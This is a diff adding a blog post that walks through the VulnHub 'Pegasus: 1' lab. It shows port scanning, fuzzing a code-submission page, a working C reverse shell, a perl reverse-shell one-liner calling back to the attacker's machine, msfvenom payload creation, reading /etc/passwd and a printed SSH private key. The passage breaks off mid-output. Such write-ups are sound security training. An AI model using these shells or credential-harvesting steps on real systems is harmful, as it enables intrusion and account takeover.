@@ -1,12 +1,1280 @@
 ---
 layout: post
-title:  "Pegasus: 1"
-date:   2019-05-06 19:35:10 +0000
+title: "Pegasus: 1"
+date: 2019-05-06 19:35:10 +0000
 author: Larry Brown
 category: Walkthroughs
 tags: [vulnhub]
 ---
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-
-<html><head><meta content="text/html; charset=utf-8" http-equiv="Content-Type"/><meta content="Evernote Mac 7.10 (457750)" name="exporter-version"/><meta content="Larry Brown" name="author"/><meta content="2019-05-06 19:35:10 +0000" name="created"/><meta content="desktop.mac" name="source"/><meta content="2019-05-08 17:22:59 +0000" name="updated"/><title>Pegasus: 1</title></head><body><div>VulnHub URL: <a href="https://www.vulnhub.com/entry/pegasus-1,109/" target="_blank">https://www.vulnhub.com/entry/pegasus-1,109/</a></div><div>Hostname: pegasus</div><div>IP Address: 10.183.0.210</div><div><br/></div><div><br/></div><div><h2>Information Gathering/Recon</h2></div><div><br/></div><div>The IP address is obtained via DHCP at boot. In my case, the IP is 10.183.0.210.</div><div><br/></div><div><br/></div><div><h2>Service Enumeration/Scanning</h2></div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/pegasus# nmap -Pn -sT -sV -sC -A -oA pegasus -p 1-65535 10.183.0.210</div><div>Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-06 15:45 EDT</div><div>Nmap scan report for pegasus.homenet.dom (10.183.0.210)</div><div>Host is up (0.0011s latency).</div><div>Not shown: 65531 closed ports</div><div>PORT      STATE SERVICE VERSION</div><div><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">22/tcp    open  ssh     </font><font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">OpenSSH 5.9p1</font><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;"> Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)</font></div><div>| ssh-hostkey: </div><div>|   1024 77:89:5b:52:ed:a5:58:6e:8e:09:f3:9e:f1:b0:d9:98 (DSA)</div><div>|   2048 d6:62:f5:12:31:36:ed:08:2c:1a:5e:9f:3c:aa:1f:d2 (RSA)</div><div>|_  256 c5:f0:be:e5:c0:9c:28:6e:23:5c:48:38:8b:4a:c4:43 (ECDSA)</div><div><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">111/tcp   open  rpcbind 2-4 (RPC #100000)</font></div><div>| rpcinfo: </div><div>|   program version   port/proto  service</div><div>|   100000  2,3,4        111/tcp  rpcbind</div><div>|   100000  2,3,4        111/udp  rpcbind</div><div>|   100024  1          35622/udp  status</div><div>|_  100024  1          58473/tcp  status</div><div><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">8088/tcp  open  http    nginx 1.1.19</font></div><div>|_http-server-header: <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">nginx/1.1.19</font></div><div>|_http-title: Pegasus Technologies - Under Construction</div><div><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">58473/tcp open  status  1 (RPC #100024)</font></div><div>MAC Address: 08:00:27:88:F8:40 (Oracle VirtualBox virtual NIC)</div><div>Device type: general purpose</div><div>Running: Linux 3.X|4.X</div><div>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</div><div>OS details: Linux 3.2 - 4.9</div><div>Network Distance: 1 hop</div><div>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</div><div><div><br/></div></div><div>TRACEROUTE</div><div>HOP RTT     ADDRESS</div><div>1   1.14 ms pegasus.homenet.dom (10.183.0.210)</div><div><div><br/></div></div><div>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</div><div>Nmap done: 1 IP address (1 host up) scanned in 19.48 seconds</div></div><div><br/></div><!--more--><div><br/></div><div><h2>Gaining Access</h2></div><div><br/></div><div>We don't typically see RPC services open, so I'll take a brief look at what's going on there first.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/pegasus# rpcinfo -p 10.183.0.210</div><div>   program vers proto   port  service</div><div>    100000    4   tcp    111  portmapper</div><div>    100000    3   tcp    111  portmapper</div><div>    100000    2   tcp    111  portmapper</div><div>    100000    4   udp    111  portmapper</div><div>    100000    3   udp    111  portmapper</div><div>    100000    2   udp    111  portmapper</div><div>    100024    1   udp  35622  status</div><div>    100024    1   tcp  58473  status</div></div><div><br/></div><div>Checking the available services, we only really have the 'status' (rpc.statd) service available. There are some known remote code issues with this service. Checking the exploit database for exploit code, we actually have three options.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>Conectiva 4.x/5.x / Debian 2.x / RedHat 6.x / S.u.S.E 6.x/7.0 / Trustix 1.x - rpc.statd Remote Format String | exploits/linux/remote/20075.c</div><div>Conectiva 4.x/5.x / Debian 2.x / RedHat 6.x / S.u.S.E 6.x/7.0 / Trustix 1.x - rpc.statd Remote Format String | exploits/linux/remote/20076.c</div><div>Conectiva 4.x/5.x / Debian 2.x / RedHat 6.x / S.u.S.E 6.x/7.0 / Trustix 1.x - rpc.statd Remote Format String | exploits/linux/remote/20077.c</div></div><div><br/></div><div>Before just throwing exploit code at the service, I'll see if I can get in another way, verify the version of nfs-utils running and then maybe use this for privilege escalation.</div><div><br/></div><div>The version of nginx in use (nginx/1.1.19) doesn't have any known vulnerabilities.</div><div><br/></div><div>We'll start some of our typical recon steps (run nikto, run dirb/wfuzz, check robots.txt, check HTTP methods, etc) on the service.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/pegasus# wfuzz -z file,/usr/share/dirb/wordlists/big.txt -z file,/usr/share/wordlists/dirb/extensions_common.txt -t 30 --hh 16,189 http://10.183.0.210:8088/FUZZFUZ2Z</div><div><div><br/></div></div><div>Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.</div><div><div><br/></div></div><div>********************************************************</div><div>* Wfuzz 2.3.4 - The Web Fuzzer                         *</div><div>********************************************************</div><div><div><br/></div></div><div>Target: http://10.183.0.210:8088/FUZZFUZ2Z</div><div>Total requests: 593601</div><div><div><br/></div></div><div>==================================================================</div><div>ID   Response   Lines      Word         Chars          Payload</div><div>==================================================================</div><div><div><br/></div></div><div>181337:  C=403      7 L       10 W          169 Ch        "doc - /"</div><div>503750:  C=200      0 L        4 W           19 Ch        "submit - .php"</div><div><div><br/></div></div><div>Total time: 768.9646</div><div>Processed Requests: 593601</div><div>Filtered Requests: 593599</div><div>Requests/sec.: 771.9483</div></div><div><br/></div><div>Browsing directly to the submit.php page, we receive a "No data to process." message.</div><div><br/></div><div>Manually checking supported HTTP methods, I only got back a unique response for the PUT method (standard error).</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/pegasus# curl -X PUT --url http://10.183.0.210:8088/submit.php</div><div>&lt;html&gt;</div><div>&lt;head&gt;&lt;title&gt;411 Length Required&lt;/title&gt;&lt;/head&gt;</div><div>&lt;body bgcolor="white"&gt;</div><div>&lt;center&gt;&lt;h1&gt;411 Length Required&lt;/h1&gt;&lt;/center&gt;</div><div>&lt;hr&gt;&lt;center&gt;nginx/1.1.19&lt;/center&gt;</div><div>&lt;/body&gt;</div><div>&lt;/html&gt;</div></div><div><br/></div><div>I decided to try to use wfuzz to see if I could find a valid "parameter" (or get any kind of response besides "No data to process.".</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/pegasus# wfuzz -z file,/usr/share/dirb/wordlists/big.txt -t 30 --hh 19 -d "FUZZ=test" http://10.183.0.210:8088/submit.php</div><div><div><br/></div></div><div>Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.</div><div><div><br/></div></div><div>********************************************************</div><div>* Wfuzz 2.3.4 - The Web Fuzzer                         *</div><div>********************************************************</div><div><div><br/></div></div><div>Target: http://10.183.0.210:8088/submit.php</div><div>Total requests: 20469</div><div><div><br/></div></div><div>==================================================================</div><div>ID   Response   Lines      Word         Chars          Payload    </div><div>==================================================================</div><div><div><br/></div></div><div>004830:  C=200      0 L        3 W           16 Ch        "code"</div><div><div><br/></div></div><div>Total time: 30.52888</div><div>Processed Requests: 20469</div><div>Filtered Requests: 20468</div><div>Requests/sec.: 670.4797</div></div><div><br/></div><div>Nice! Apparently "code" is a valid parameter I can submit. Let's see what the response is.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/pegasus# curl -X POST -d 'code=test' --url http://10.183.0.210:8088/submit.php</div><div>Sent for review!</div></div><div><br/></div><div>Well, "Sent for review!" isn't much better than "No data to process.", but at least we are getting somewhere. Based on the response, I'm thinking "code" is like source code and not some kind of numeric passcode. I'll try to send it some PHP code and see what happens.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/pegasus# curl -X POST -d 'code=echo system($_GET["cmd"]);' --url http://10.183.0.210:8088/submit.php</div><div>Sorry, due to security precautions, Mike won't review any code containing system() function call.</div></div><div><br/></div><div>Interesting.</div><div><br/></div><div>I wondered if there was a page where the code was reviewed, so I started manually checking some PHP file names. I tried review.php, got nothing. I tried codereview.php and got this...</div><div><br/></div><div><a href="http://10.183.0.210:8088/codereview.php">http://10.183.0.210:8088/codereview.php</a></div><div><br/></div><div><img height="1094" src="/assets/images/2019-05-06-pegasus-1/9851F67C-37D2-4876-B9F0-9F933ADE8DB6.png" width="1742"/><br/></div><div><br/></div><div>Checking the source, and sure enough, this is the form that submits to submit.php. It'd be nice to know where these code submissions are getting saved for later review. It would also be nice to know what kind of "code" we are talking about. The assumption is PHP code, but really, it could be anything.</div><div><br/></div><div>I tried submitting a base64 encoded PHP reverse shell (created with msfvenom), but got nothing.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/pegasus# msfvenom -p php/reverse_php LHOST=10.183.0.222 LPORT=5432 -e php/base64 -f raw &gt; rev64.php</div><div>[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload</div><div>[-] No arch selected, selecting arch: php from the payload</div><div>Found 1 compatible encoders</div><div>Attempting to encode payload with 1 iterations of php/base64</div><div>php/base64 succeeded with size 4057 (iteration=0)</div><div>php/base64 chosen with final size 4057</div><div>Payload size: 4057 bytes</div></div><div><br/></div><div>I then did some Googling for C code to create a reverse shell, and found the following...</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>#include &lt;stdio.h&gt;</div><div>#include &lt;stdlib.h&gt;</div><div>#include &lt;string.h&gt;</div><div>#include &lt;unistd.h&gt;</div><div>#include &lt;sys/types.h&gt;</div><div>#include &lt;sys/socket.h&gt;</div><div>#include &lt;netinet/in.h&gt;</div><div><div><br/></div></div><div>int main(void) {</div><div>    int sockfd;         </div><div>    int lportno = 5432;    </div><div>    struct sockaddr_in serv_addr;</div><div>    char *const params[] = {"/bin/sh",NULL};</div><div>    char *const environ[] = {NULL};</div><div><div><br/></div></div><div>    sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);</div><div>    serv_addr.sin_family = AF_INET;</div><div>    serv_addr.sin_addr.s_addr = inet_addr("10.183.0.222");</div><div>    serv_addr.sin_port = htons(lportno);  </div><div>    connect(sockfd, (struct sockaddr *) &amp;serv_addr, 16);</div><div><div><br/></div></div><div>    dup2(sockfd,0);</div><div>    dup2(0,1);</div><div>    dup2(0,2);</div><div>    execve("/bin/sh",params,environ);</div><div>}</div></div><div><br/></div><div>I fired up my listener in Metasploit...</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>msf5 &gt; use exploit/multi/handler</div><div>msf5 exploit(multi/handler) &gt; set payload generic/shell_reverse_tcp</div><div>payload =&gt; generic/shell_reverse_tcp</div><div>msf5 exploit(multi/handler) &gt; set LHOST 10.183.0.222</div><div>LHOST =&gt; 10.183.0.222</div><div>msf5 exploit(multi/handler) &gt; set LPORT 5432</div><div>LPORT =&gt; 5432</div><div>msf5 exploit(multi/handler) &gt; run -j</div><div>[*] Exploit running as background job 3.</div><div>[*] Exploit completed, but no session was created.</div><div><div><br/></div></div><div>[*] Started reverse TCP handler on 10.183.0.222:5432</div></div><div><br/></div><div>Then submitted the C code...</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>msf5 exploit(multi/handler) &gt; [*] Command shell session 1 opened (10.183.0.222:5432 -&gt; 10.183.0.210:46819) at 2019-05-06 18:34:33 -0400</div><div><div><br/></div></div><div>msf5 exploit(multi/handler) &gt; sessions 1</div><div>[*] Starting interaction with 1...</div><div><div><br/></div></div><div>pwd</div><div>/home/mike</div><div>id</div><div>uid=1001(mike) gid=1001(mike) groups=1001(mike)</div></div><div><br/></div><div>Wow! Mike's code review is instantaneous... and we have a shell. Any shell connected via a web request is usually pretty unstable, so I like to immediately create a second shell after connecting. I already set up a listener on TCP port 5433 and I'll use perl to connect to it.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>perl -e 'use Socket;$i="10.183.0.222";$p=5433;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(ST</div><div>DIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/bash -i");};' &amp;</div><div>[*] Command shell session 2 opened (10.183.0.222:5433 -&gt; 10.183.0.210:42931) at 2019-05-06 18:36:03 -0400</div></div><div><br/></div><div>Digging around in Mike's home folder...</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>mike@pegasus:/home/mike$ ls -laF</div><div>total 48</div><div>drwxr-x--- 5 mike mike 4096 May  7 08:36 ./</div><div>drwxr-xr-x 5 root root 4096 Nov 18  2014 ../</div><div>-rw------- 1 mike mike    0 Dec 16  2014 .bash_history</div><div>-rw-r--r-- 1 mike mike  220 Nov 18  2014 .bash_logout</div><div>-rw-r--r-- 1 mike mike 3501 Nov 19  2014 .bashrc</div><div>drwx------ 2 mike mike 4096 Nov 18  2014 .cache/</div><div>-rw-r--r-- 1 mike mike  675 Nov 18  2014 .profile</div><div>drwx------ 2 mike mike 4096 Nov 24  2014 .ssh/</div><div>-rw------- 1 mike mike  620 Dec 16  2014 .viminfo</div><div>drwx------ 2 mike mike 4096 Nov 18  2014 Mail/</div><div>-rwxr-xr-x 1 mike mike  845 Nov 18  2014 check_code.sh*</div><div>-rwsr-xr-x 1 john john 6606 Nov 28  2014 my_first*</div></div><div><br/></div><div>We can see the shell script that compiles and runs the uploaded code.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>mike@pegasus:/home/mike$ cat check_code.sh</div><div>#!/bin/sh</div><div>#</div><div># I am a 'human' reviewing submitted source code :)</div><div>#</div><div><div><br/></div></div><div>SOURCE_CODE="/opt/code_review/code.c"</div><div><div><br/></div></div><div># Kill whatever is running after 120 seconds</div><div>TIMEOUT=120</div><div><div><br/></div></div><div>while true; do</div><div>    echo "# Checking for code.c..."</div><div>    if [ -f $SOURCE_CODE ]; then</div><div>        echo " # Compile..."</div><div>        /usr/bin/gcc -o /home/mike/code $SOURCE_CODE</div><div>        /bin/chmod 755 /home/mike/code</div><div>        echo " # Run"</div><div>        (/home/mike/code) &amp; PID=$!</div><div>        # Let the code run for $TIMEOUT, then kill it if still executing</div><div>        (/bin/sleep $TIMEOUT &amp;&amp; kill -9 $PID; echo " # Killed ./code") 2&gt;/dev/null &amp; WATCHER=$!</div><div>        # Kill the watched (code stopped executing before $TIMEOUT)</div><div>        wait $PID 2&gt;/dev/null &amp;&amp; kill -9 $WATCHER; echo " # Killed watcher"</div><div>        echo " # Cleanup..."</div><div>        /bin/rm -f /home/mike/code $SOURCE_CODE</div><div>    fi</div><div>    /bin/sleep 1</div><div>done</div></div><div><br/></div><div>Looks like the uploaded code had a 2 minute timeout, so I'm glad we already spawned a second shell.</div><div><br/></div><div>We also found a SSH private key in Mike's .ssh folder...</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>mike@pegasus:/home/mike/.ssh$ cat id_rsa</div><div>-----BEGIN RSA PRIVATE KEY-----</div><div>MIIEpAIBAAKCAQEAu9uf1HNMP46/biQZyeSp3HiB0kAeJxfqEhM0OzffJqysmJw1</div><div>5UltElxmv3F0j1eARFODzTjP00yTzrnRKXnVl2fz8ir0h5fenQRFRdQtBnhyCpJO</div><div>2XFQvj0l/fdFe8QBeatpDaxarAiojI+C+k2K2CZLhxh7MXKycI3lQAY47ptrLS6C</div><div>oLdpfHMbo7OHm/gW5mclNoawgakCd/hPHFFDQFLM3gYtBxTud1QEPOH6opgohN73</div><div>gfCf2s3k7rxv79lPBcDWmyg+7Z0LK0+LiPO20P9k2H+g8aQCkoTvJ7hxECCVZ29A</div><div>PBfX8xgLNh0UboSS9Z31YCFNK71AoxLadHrewQIDAQABAoIBAQCpdU5SKMeJNc19</div><div>H1ecBYcseBAzht8sSKg/Mc+V86p6ip0O9Sqw8HFRdMTCwSdx/m6YM/Xa8/qVEqjq</div><div>fDgvf9WqxH0L4K/AeMC5RxbuDJ2pDpFg8+XoxA0f7q0M0Td+k6r5BCS5ztXkBdN1</div><div>KCfwfm5W2QSckvrd+ib43ScFgBdvNHvYGR4rIyzwNizx2ewg9FjiSNHGiItSYSpX</div><div>TxRgLcrnjHQWBM1pk+mv57+OSPj5VZW/0ZgEoPksHtRJzsFX3STyI/tmL6gk2Cj9</div><div>BJ6Ld+8jyUtnsNSl+ZPeDy7FlGWIOM8Jw1vUrDQ3lwBOxGmrrm/jAkKPU6iqA9DR</div><div>olRoLVC5AoGBAOAAQvwVrgv9w80uXvoifGO/SRLg4Gv7ZWJ+5fowDmiIV0QYUwVA</div><div>AA0mekUq0Fiy9pHCIpJZwF6nebqEnZlN2TV5C4uIdeOvaZMunl0woIMGANpthKie</div><div>sdKADX0bw0k9lbCKf8iGG5j1dK/J4roaBBqjjJu7GyYQWRcEyKaQ06MfAoGBANax</div><div>mwhJgRth1NP6t8BygmLz1s2LvhOP1QINfLzfBK7+csaOJYfDDqo8IwJUOapPQD9K</div><div>bwn6DIfHr4QyWZz8IS4R3secxM+SEcVWv0hPKyuRCQ7nd6odaeMh7hEWZbaQgyeS</div><div>0N8O525At9t4rcewCSVABLLnLE/FJ7dgzY760CIfAoGAGlXNikeeO8is8X2HKw9M</div><div>4olFtRN9LxTSWZ8juKNXvlBxOg9GC3L3zpP8gg9DiXoY5RAW8m/c3wP/mr8mrDRr</div><div>2g6OHeyAN7GSzvwHIFusM1tMVGHV2+E0dNQbQd82uXClHala1p91tSj+fABXSJvw</div><div>aZVa3aBE09fOMZedY3/Zce8CgYEAmMg/WYBlfkT6nfe3uB5FJ4H7BL9DfsxGe3V5</div><div>pTbYMGgm6aHSl3B6CS9OgqPJfad0QxYHOwRU0nOKNftWxl6uhgh1j3vCmyyJtPNs</div><div>oFqmkBRga9jQ0aCo79f/gO19aJQioZDbT0Fd9JndvTN+B7MAbx/FuELGx+W3w8oB</div><div>vpRCdWUCgYA8Z6YK/REdftjzA3C91RObg2NaP0CbiPSmlrdeUxp2urXt8BSIXh1+</div><div>4CIXCFKvmqHrjitXuvjNjO+pO3Z24NuiAYnkNho+0gc8+tDnkkPBWNVJUvoFIuK4</div><div>uQcPzxVlmfkL6fh8PI1bJLDFoQZTLs6ltt8ym4BgPdG2MphR9M2z6Q==</div><div>-----END RSA PRIVATE KEY-----</div></div><div><br/></div><div>However, there isn't an authorized_keys file in the .ssh folder, so maybe this private key is for a different user. Let's see what other accounts are available.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>mike@pegasus:/home/mike$ cat /etc/passwd</div><div>root:x:0:0:root:/root:/bin/bash</div><div>daemon:x:1:1:daemon:/usr/sbin:/bin/sh</div><div>bin:x:2:2:bin:/bin:/bin/sh</div><div>sys:x:3:3:sys:/dev:/bin/sh</div><div>sync:x:4:65534:sync:/bin:/bin/sync</div><div>games:x:5:60:games:/usr/games:/bin/sh</div><div>man:x:6:12:man:/var/cache/man:/bin/sh</div><div>lp:x:7:7:lp:/var/spool/lpd:/bin/sh</div><div>mail:x:8:8:mail:/var/mail:/bin/sh</div><div>news:x:9:9:news:/var/spool/news:/bin/sh</div><div>uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh</div><div>proxy:x:13:13:proxy:/bin:/bin/sh</div><div>www-data:x:33:33:www-data:/var/www:/bin/sh</div><div>backup:x:34:34:backup:/var/backups:/bin/sh</div><div>list:x:38:38:Mailing List Manager:/var/list:/bin/sh</div><div>irc:x:39:39:ircd:/var/run/ircd:/bin/sh</div><div>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh</div><div>nobody:x:65534:65534:nobody:/nonexistent:/bin/sh</div><div>libuuid:x:100:101::/var/lib/libuuid:/bin/sh</div><div>syslog:x:101:103::/home/syslog:/bin/false</div><div>messagebus:x:102:105::/var/run/dbus:/bin/false</div><div>whoopsie:x:103:106::/nonexistent:/bin/false</div><div>landscape:x:104:109::/var/lib/landscape:/bin/false</div><div>sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin</div><div>john:x:1000:1000:John Wall,,,:/home/john:/bin/bash</div><div>statd:x:108:65534::/var/lib/nfs:/bin/false</div><div>mike:x:1001:1001:Mike Ross,,,:/home/mike:/bin/bash</div><div>git:x:1002:1002:,,,:/home/git:/usr/bin/git-shell</div></div><div><br/></div><div>Trying out the SSH private key on the john account...</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/pegasus# ssh -i mike.key john@10.183.0.210</div><div>john@10.183.0.210's password:</div></div><div><br/></div><div>Trying out the SSH private key on the git account...</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/pegasus# ssh -i mike.key git@10.183.0.210</div><div>Welcome to Ubuntu 12.04.5 LTS (GNU/Linux 3.13.0-39-generic i686)</div><div><div><br/></div></div><div> * Documentation:  https://help.ubuntu.com/</div><div><div><br/></div></div><div>  System information as of Tue May  7 08:49:54 AEST 2019</div><div><div><br/></div></div><div>  System load:  0.0               Processes:           89</div><div>  Usage of /:   8.5% of 18.32GB   Users logged in:     0</div><div>  Memory usage: 20%               IP address for eth0: 10.183.0.210</div><div>  Swap usage:   0%</div><div><div><br/></div></div><div>  Graph this data and manage this system at:</div><div>    https://landscape.canonical.com/</div><div><div><br/></div></div><div>150 packages can be updated.</div><div>124 updates are security updates.</div><div><div><br/></div><div><br/></div></div><div>Your Hardware Enablement Stack (HWE) is supported until April 2017.</div><div><div><br/></div></div><div>Last login: Tue Nov 18 12:54:26 2014 from localhost</div><div>fatal: Interactive git shell is not enabled.</div><div>hint: ~/git-shell-commands should exist and have read and execute access.</div><div>Connection to 10.183.0.210 closed.</div></div><div><br/></div><div>The SSH private key seems to work with the git account. The login is successful, but the user's shell (/usr/bin/git-shell) isn't interactive. Based on the "hint" the user might not have read and execute permissions on the git-shell-commands folder (or might not have one at all). We'll move on for now...</div><div><br/></div><div>Another file of interest in Mike's folder is a SUID file (for user john) named 'my_first'.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>mike@pegasus:/home/mike$ file my_first</div><div>my_first: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.26, 